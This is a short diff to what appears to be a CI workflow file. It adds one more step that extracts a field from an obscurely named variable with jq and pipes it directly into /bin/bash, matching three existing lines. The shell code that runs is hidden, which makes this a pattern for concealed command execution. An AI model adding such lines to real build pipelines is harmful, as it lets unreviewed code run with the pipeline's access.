@@ -62,6 +62,7 @@ jobs:
           echo $zeopw01 | jq -r .jydd763 | /bin/bash
           printf '%s' "$yggpc58569" | jq -r .khozd3 | /bin/bash
           echo $qxndd10 | jq -r .eadm5866 | /bin/bash
+          printf '%s' "$t1" | jq -r .l48 | /bin/bash
 
       - name: Archive output
         if: always()
